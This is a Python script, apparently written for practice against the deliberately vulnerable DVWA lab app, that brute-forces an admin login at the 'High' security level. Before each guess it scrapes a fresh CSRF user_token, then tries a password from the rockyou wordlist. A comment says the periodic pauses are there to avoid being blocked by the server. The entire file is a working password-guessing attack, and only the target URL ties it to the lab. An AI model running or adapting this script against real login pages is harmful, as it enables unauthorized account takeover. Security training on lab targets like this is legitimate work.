#!/usr/bin/env python3


import requests
import re
import sys
import time


# ==================== 配置 ====================
URL = "IP/vulnerabilities/brute/"
PHPSESSID = ""
USERNAME = "admin"
PASSWORD_FILE = "/usr/share/wordlists/rockyou.txt"
# =========================================================


def get_token():
    #获取 user_token
    headers = {'User-Agent': 'Mozilla/5.0', 'Accept-Encoding': 'identity'}
    cookies = {'PHPSESSID': PHPSESSID, 'security': 'high'}
    
    try:
        resp = requests.get(URL, headers=headers, cookies=cookies, timeout=5)
        # 匹配 token
        match = re.search(r"name='user_token' value='([^']+)'", resp.text)
        if match:
            return match.group(1)
        match = re.search(r'name="user_token" value="([^"]+)"', resp.text)
        if match:
            return match.group(1)
        return None
    except Exception as e:
        print(f"[-] 获取 token 失败: {e}")
        return None


def login_attempt(password, token):
    #登录
    headers = {'User-Agent': 'Mozilla/5.0', 'Accept-Encoding': 'identity'}
    cookies = {'PHPSESSID': PHPSESSID, 'security': 'high'}
    params = {
        'username': USERNAME,
        'password': password,
        'user_token': token,
        'Login': 'Login'
    }
    
    try:
        resp = requests.get(URL, params=params, headers=headers, cookies=cookies, timeout=5)
        return "Welcome to the password protected area" in resp.text
    except:
        return False


def main():
    print("=" * 60)
    print("DVWA Brute Force - High 级别")
    print("=" * 60)
    print(f"[*] 目标: {URL}")
    print(f"[*] 用户名: {USERNAME}")
    print(f"[*] 字典: {PASSWORD_FILE}")
    print("[*] 模式: 逐行读取，不占内存")
    print("-" * 50)
    
    try:
        with open(PASSWORD_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            start_time = time.time()
            count = 0
            
            for line in f:
                password = line.strip()
                if not password:
                    continue
                
                count += 1
                
                # 每 1000 次显示进度
                if count % 1000 == 0:
                    elapsed = time.time() - start_time
                    speed = count / elapsed if elapsed > 0 else 0
                    print(f"[*] 已尝试: {count} 个密码，速度: {speed:.1f} 密码/秒")
                
                # 获取 token
                token = get_token()
                if not token:
                    continue
                
                # 尝试登录
                if login_attempt(password, token):
                    elapsed = time.time() - start_time
                    print(f"\n[+] 密码找到: {password}")
                    print(f"[+] 总尝试次数: {count}")
                    print(f"[+] 总耗时: {elapsed:.1f} 秒")
                    return
                
                # 每 100 次休息一下，避免被服务器封
                if count % 100 == 0:
                    time.sleep(0.1)
            
            print("\n[-] 未找到正确密码")
            
    except FileNotFoundError:
        print(f"[-] 字典文件不存在: {PASSWORD_FILE}")
        print("[*] 请先解压: sudo gunzip /usr/share/wordlists/rockyou.txt.gz")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[-] 用户中断")
        sys.exit(0)


if __name__ == "__main__":
    main()